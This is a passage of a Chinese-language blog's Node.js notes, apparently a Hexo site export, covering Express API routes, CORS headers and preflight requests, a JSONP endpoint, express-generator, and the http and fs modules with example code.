 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 express 模塊</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="comment">// 創建 express 服務器實例</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置解析表單數據的中間件</span></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 導入路由模塊</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;./apiRouter&#x27;</span>)</span><br><span class="line"><span class="comment">// 註冊路由模塊</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/api&#x27;</span>, router)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 啟動 Web 服務器</span></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Express server running at http://127.0.0.1:3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>創建 API 路由模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入 express 模塊</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="comment">// 創建 express 路由對象</span></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// bind your router here...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴露路由模塊</span></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router</span><br></pre></td></tr></table></figure>


</li>
<li><p>編寫<code>GET</code>接口：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/get&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 通過 req.query 獲取客戶端通過查詢字符串，發送到服務器的數據</span></span><br><span class="line">    <span class="keyword">const</span> query = req.<span class="property">query</span></span><br><span class="line">    <span class="comment">// 調用 res.send 方法向客戶端響應處理的結果</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">state</span>: <span class="number">0</span>,                       <span class="comment">// 0 - 處理成功 | 1 - 處理失敗</span></span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;GET request succeeded&#x27;</span>,   <span class="comment">// 說明處理結果</span></span><br><span class="line">        <span class="attr">data</span>: query                     <span class="comment">// 需要響應給客戶端的數據</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>


</li>
<li><p>編寫<code>POST</code>接口：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/post&#x27;</span> ,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 通過 req.body 獲取請求體中包含 urlencoded 格式的數據</span></span><br><span class="line">    <span class="keyword">const</span> body = req.<span class="property">body</span></span><br><span class="line">    <span class="comment">// 調用 res.send 方法向客戶端響應結果</span></span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="attr">state</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>: <span class="string">&#x27;POST request succeeded&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: body</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="測試接口"><a href="#測試接口" class="headerlink" title="測試接口"></a>測試接口</h3><ol>
<li><p>測試<code>GET</code>接口</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnGET&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/get&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;Donald&#x27;</span>,</span><br><span class="line">            <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>測試<code>POST</code>接口</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnPOST&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/post&#x27;</span>,</span><br><span class="line">        <span class="attr">data</span>: &#123;</span><br><span class="line">            <span class="attr">bookname</span>: <span class="string">&#x27;The old man and the sea&#x27;</span>,</span><br><span class="line">            <span class="attr">price</span>: <span class="number">20</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="跨域問題"><a href="#跨域問題" class="headerlink" title="跨域問題"></a>跨域問題</h3><ol>
<li>接口的跨域問題：<ul>
<li>剛才編寫的<code>GET</code>與<code>POST</code>接口，存在一個嚴重問題：<font color="#f54747">不支持跨域請求</font></li>
<li>解決跨域問題只要方案由兩種：<ol>
<li>CORS （主流方案，推薦使用）</li>
<li>JSONP （有缺陷的方案，只支持<code>GET</code>請求）</li>
</ol>
</li>
</ul>
</li>
</ol>
<h4 id="CORS-跨域資源共享"><a href="#CORS-跨域資源共享" class="headerlink" title="CORS 跨域資源共享"></a>CORS 跨域資源共享</h4><ol>
<li><p>簡介：</p>
<ul>
<li><code>cors</code>是<code>Express</code>的一個第三方中間件</li>
<li>通過安裝和配置<code>cors</code>中間件，可以方便地解決跨域問題</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i cors</span><br></pre></td></tr></table></figure>
</li>
<li><p>導入中間件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>在路由之前註冊為全局中間件：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>())</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>CORS 原理：</p>
<ul>
<li>CORS (Cross-Origin Resource Sharing 跨域資源共享) </li>
<li>由一系列<font color="#f54747"><code>HTTP</code>響應頭</font>組成，這些響應頭決定瀏覽器是否阻止前端<code>JS</code>代碼跨域獲取資源</li>
<li>瀏覽器的<font color="skyblue">同源安全策略</font>默認會阻止網頁「跨域」獲取資源</li>
<li>圖示：  <img src="https://p.ipic.vip/gc9d54.png" width="380px">
  <img src="https://p.ipic.vip/sq42ll.png" width="380px"></li>
<li>注意事項：<ol>
<li>CORS 主要在<font color="#f54747">服務器端</font>進行配置，客戶端瀏覽器<font color="#f54747">無須做任何額外的配置</font>，即可請求開啟 CORS 的接口</li>
<li>CORS 在瀏覽器中有兼容性，只支 XMLHttpRequest Level2 的瀏覽器才可以正常訪問開啟了 CORS 的服務端接口</li>
</ol>
</li>
</ul>
</li>
</ol>
<h4 id="CORS-響應頭"><a href="#CORS-響應頭" class="headerlink" title="CORS 響應頭"></a>CORS 響應頭</h4><ol>
<li><p>Access-Control-Allow-Origin</p>
<ul>
<li>響應頭中可以攜帶一個 Access-Control-Allow-Origin 字段</li>
<li>語法：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 參數、origin: 指定允許訪問該資源的外域 URL</span></span><br><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)   <span class="comment">// 允許所有網頁</span></span><br><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="string">&#x27;https://www.google.com&#x27;</span>)  <span class="comment">// 只允許 Google</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Access-Control-Allow-Header</p>
<ul>
<li>默認情況下，CORS 僅支持客戶端向服務端發送如下九個請求頭：<br>  Accept, Accept-Language, Content-Language, DPR, Downlink,<br>  Save-Data, Viewport-Width, Width, Content-Type</li>
<li>如果客戶端向服務端<font color="#f54747">發送了額外的請求頭信息</font>，則需要在<font color="#f54747">服務器端</font>，通過 Access-Control-Allow-Header <font color="#f54747">對額外的請求頭進行聲明</font>，否則請求會失敗</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Header&#x27;</span>, <span class="string">&#x27;Content-Type, X-Custom-Header&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Access-Control-Allow-Methods</p>
<ul>
<li>默認情況下，CORS 只支持客戶端發起<code>GET</code>、<code>POST</code>和<code>HEAD</code>請求</li>
<li>如果客戶端希望通過<code>PUT</code>、<code>DELETE</code>等方式請求服務器資源，則需要在服務器端，通過 Access-Control-Allow-Methods 來<font color="#f54747">指明實際請求所允許使用的 HTTP 方法</font></li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;POST, GET, DELETE, HEAD&#x27;</span>)    <span class="comment">// 僅支持這些方式</span></span><br><span class="line">res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)  <span class="comment">// 支持任何請求方式</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h4 id="CORS-請求分類"><a href="#CORS-請求分類" class="headerlink" title="CORS 請求分類"></a>CORS 請求分類</h4><ol>
<li><p>簡介：</p>
<ul>
<li>客戶端在請求 CORS 接口時，根據請求方式和請求頭的不同，可以將 CORS 分成兩大類：<ol>
<li>簡單請求</li>
<li>預檢請求</li>
</ol>
</li>
</ul>
</li>
<li><p>簡單請求：</p>
<ul>
<li>當請求滿足以下條件：<ol>
<li>請求方式：<code>GET</code>、<code>POST</code>、<code>HEAD</code>三者之一</li>
<li>請求頭中無自定義頭部字段</li>
</ol>
</li>
</ul>
</li>
<li><p>預檢請求：</p>
<ul>
<li><p>當請求符合以下任何一個條件：</p>
<ol>
<li>請求方式：<code>GET</code>、<code>POST</code>、<code>HEAD</code>之外的請求類型</li>
<li>請求頭中包含自定義的頭部字段</li>
<li>想服務器發送了<code>application/json</code>格式的數據</li>
</ol>
</li>
<li><p>在瀏覽器與服務器正式通信前，瀏覽器會先發送 OPTION 請求進行預檢，以獲知服務器是否允許該實際請求（OPTION 請求就是預檢請求）</p>
</li>
<li><p>服務器成功響應檢測請求後，才會發送真正的請求，並攜帶真實數據</p>
</li>
</ul>
</li>
<li><p>簡單請求與預檢請求的區別：</p>
<ul>
<li>簡單請求：客戶端與服務器之間<font color="#f54747">只會發生一次請求</font></li>
<li>預檢請求：客戶端與服務器之間<font color="#f54747">會發生兩次請求</font>，OPTION 檢測請求成功之後，才發起真正的請求</li>
</ul>
</li>
</ol>
<h4 id="JSONP接口"><a href="#JSONP接口" class="headerlink" title="JSONP接口"></a>JSONP接口</h4><ol>
<li><p>簡介：</p>
<ul>
<li>概念：瀏覽器通過<code>&lt;scipt&gt;</code>標籤的<code>src</code>屬性，請求服務器上的數據，同時服務器返回一個函數的調</li>
<li>特點：<ol>
<li>JSONP 不屬於真正的 AJAX 請求，因為沒有使用<code>XMLHttpRequest</code>對象</li>
<li>JSONP 僅支持<code>GET</code>請求</li>
</ol>
</li>
</ul>
</li>
<li><p>創建 JSONP 接口的注意事項：</p>
<ul>
<li>如果項目中已經配置了 CORS 跨域資源共享，<font color="#f54747">為了防止衝突，必須在配置 CORS 中間件前聲明 JSONP 的接口</font>，否則 JSONP 接口會被處理成開啟了 CORS 的接口</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 必須在配置 cors 中間件前配置 JSONP 的接口</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/jsonp&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">		</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>實現 JSONP 接口步驟：</p>
<ol>
<li>獲取客戶端發送過來的<font color="#f54747">回調函數名字</font></li>
<li>得到要通過 JSONP 形式<font color="#f54747">發送給客戶端的數據</font></li>
<li>根據前兩步得到的數據，<font color="#f54747">拼接出一個函數調用的字符串</font></li>
<li>把上一步拼接得到的字符串，響應給客戶端的<code>&lt;script&gt;</code>標籤進行解析執行</li>
</ol>
<ul>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/jsonp&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 得到函數的名稱</span></span><br><span class="line">    <span class="keyword">const</span> functName = req.<span class="property">query</span>.<span class="property">callback</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 定義要發送到客戶端的數據對象</span></span><br><span class="line">    <span class="keyword">const</span> data = &#123;<span class="attr">name</span>: <span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 拼接出一個函數的調用</span></span><br><span class="line">    <span class="keyword">const</span> scriptStr = <span class="string">`<span class="subst">$&#123;functName&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>)`</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 把拼接的字符串響應給客戶端</span></span><br><span class="line">    res.<span class="title function_">send</span>(scriptStr)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>發起 JSONP 請求：</p>
<ul>
<li>調用<code>$ajax()</code>函數，提供 JSONP 得配置項，從而發起 JSONP 請求</li>
<li>具體編碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#btnJSONP&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;http://127.0.0.1:3000/api/jsonp&#x27;</span>,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&#x27;jsonp&#x27;</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">res</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="服務端渲染"><a href="#服務端渲染" class="headerlink" title="服務端渲染"></a>服務端渲染</h2><ol>
<li><p>常見前後端交互：</p>
<ul>
<li>前端做好靜態頁面、動態效果、JSON模擬、Ajax、動態創建頁面、真實接口數據</li>
<li>把前端提供給後端靜態資源文件夾</li>
</ul>
</li>
<li><p>服務器渲染、後端嵌套模板、後端渲染模板</p>
<ul>
<li>前端做好靜態頁面、動態效果</li>
<li>把前端代碼提供給後端，後端把靜態頁面和裡面的假數據刪除，通過模板進行動態生成頁面內容</li>
</ul>
</li>
</ol>
<h2 id="express生成器"><a href="#express生成器" class="headerlink" title="express生成器"></a>express生成器</h2><ol>
<li><p>簡介：</p>
<ul>
<li>通過應用生成器工具<code>express-generator</code>快速創建一個應用腳手架</li>
</ul>
</li>
<li><p>基本使用：</p>
<ol>
<li><p>安裝：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx express-generator</span><br></pre></td></tr></table></figure>
</li>
<li><p>啟動腳手架：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">express <span class="string">&#x27;projectName&#x27;</span> --view=ejs</span><br></pre></td></tr></table></figure>
</li>
<li><p>安裝中間件：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm i</span><br></pre></td></tr></table></figure>
</li>
<li><p>更改文件渲染：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">--------------------------------</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">renderFile</span>)   <span class="comment">// 支持直接渲染 html 文件</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Web BackEnd</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>express</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJS - Modules</title>
    <url>/myBlog/2022/07/01/2022/BackEnd/2022-7-1-NodeJS-Modules/</url>
    <content><![CDATA[<h2 id="http模塊"><a href="#http模塊" class="headerlink" title="http模塊"></a>http模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>http</code>模塊是<code>Node.js</code>官方提供用於創建<code>Web</code>服務器的模塊</li>
</ul>
</li>
<li><p>作用：</p>
<ul>
<li>基於<code>Node.js</code>提供的<code>http</code>模塊，就可以簡單的手寫一個服務器軟件，從而對外提供<code>Web</code>服務</li>
</ul>
</li>
<li><p>創建Web服務器：</p>
<ol>
<li><p>導入http模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>創建服務器實例：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>服務器實例綁定<code>request</code>事件，用於監聽客戶端請求：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;...&#125;)    <span class="comment">// (事件, 回調函數)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>啟動服務器：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;...&#125;)  <span class="comment">// (通訊埠, 回調函數)</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 導入http模塊</span></span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 創建web服務器實例</span></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 為服務器綁定request事件，監聽客戶端請求</span></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;request&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Someone sent a request&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 啟動服務器在8080端口</span></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="res響應對象"><a href="#res響應對象" class="headerlink" title="res響應對象"></a>res響應對象</h3><ol>
<li><p>作用：</p>
<ul>
<li>用於返回渲染的內容，訪問與服務器相關的數據或屬性</li>
</ul>
</li>
<li><p>對象屬性：</p>
<ol>
<li><p>往瀏覽器寫入內容：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">write</span>(str)  <span class="comment">// 往瀏覽器寫入 str 內容</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>寫入並表示傳輸的結束：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">end</span>(str)    <span class="comment">// 向客戶端響應內容(str)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>設置響應頭：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 設置響應頭(響應頭類型、編譯方式、編碼方式)</span></span><br><span class="line">res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span>&#125;)</span><br><span class="line">res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/plain; charset=utf-8&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">server.<span class="title function_">on</span>(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 設置響應頭，修改編譯格式</span></span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">404</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 往瀏覽器寫入內容</span></span><br><span class="line">    res.<span class="title function_">write</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;b&gt;Hello World&lt;/b&gt;</span></span><br><span class="line"><span class="string">            &lt;div&gt;你好&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    `</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 傳輸結束</span></span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="req請求對象"><a href="#req請求對象" class="headerlink" title="req請求對象"></a>req請求對象</h3><ol>
<li><p>作用：</p>
<ul>
<li>用於接收瀏覽器傳的參數，訪問與客戶端相關的數據或屬性</li>
</ul>
</li>
<li><p>對象屬性：</p>
<ol>
<li><p>獲取瀏覽器路徑：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> url = req.<span class="property">url</span>     <span class="comment">// 值為客戶端請求的URL地址（域名及通訊埠後的字符串）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>獲取請求類型：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> method = req.<span class="property">method</span>   <span class="comment">// 值為客戶端的 method 請求類型</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入方法</span></span><br><span class="line"><span class="keyword">var</span> moduleRenderHTML = <span class="built_in">require</span>(<span class="string">&#x27;./modules/renderHTML&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> moduleRenderStatus = <span class="built_in">require</span>(<span class="string">&#x27;./modules/RenderStatus&#x27;</span>)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&quot;request&quot;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// req 接收瀏覽器傳的參數</span></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">url</span> === <span class="string">&#x27;/favicon.ico&#x27;</span>) <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// res 返回渲染的內容</span></span><br><span class="line">    res.<span class="title function_">writeHead</span>(moduleRenderStatus.<span class="title function_">renderStatus</span>(req.<span class="property">url</span>), &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.<span class="title function_">write</span>(moduleRenderHTML.<span class="title function_">renderHTML</span>(req.<span class="property">url</span>))</span><br><span class="line">    res.<span class="title function_">end</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="fs文件系統模塊"><a href="#fs文件系統模塊" class="headerlink" title="fs文件系統模塊"></a>fs文件系統模塊</h2><ol>
<li><p>簡介：</p>
<ul>
<li><code>fs</code>模塊是<code>Node.js</code>官方提供用於操作文件的模塊</li>
</ul>
</li>
<li><p>導入<code>fs</code>模塊：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="fs模塊內置方法"><a href="#fs模塊內置方法" class="headerlink" title="fs模塊內置方法"></a>fs模塊內置方法</h3><ol>
<li><p><code>fs.readFile</code>方法：</p>
<ul>
<li><p>用於讀取指定文件中的內容</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>：必選參數，字符串，表示文檔路徑</li>
<li><code>options</code>：可選參數，表示編碼格式，默認值<code>utf8</code></li>
<li><code>callback</code>：必選參數，文件讀取完後的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.<span class="title function_">readFile</span>(path, options, callback)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以utf-8形式編譯讀取1.txt文檔</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;./files/1.txt&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">(<span class="params">err, dataStr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;讀取文件失敗：&#x27;</span>, err.<span class="property">message</span>)   <span class="comment">// 錯誤信息</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;讀取文件成功：&#x27;</span>, dataStr)  <span class="comment">// 讀取內容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>fs.writeFile</code>方法：</p>
<ul>
<li><p>用於向指定文件中寫入內容</p>
</li>
<li><p>語法：</p>
<ol>
<li><code>path</code>參數：必選參數，字符串，表示文檔路徑</li>
<li><code>data</code>參數：必選參數，表示要寫入的內容</li>
<li><code>options</code>：可選參數，表示編碼格式，默認值utf8</li>
<li><code>callback</code>：必選參數，文件讀取完後的回調函數  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">fs.<span class="title function_">writeFile</span>(path, data, options, callback)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>具體編碼：</p>
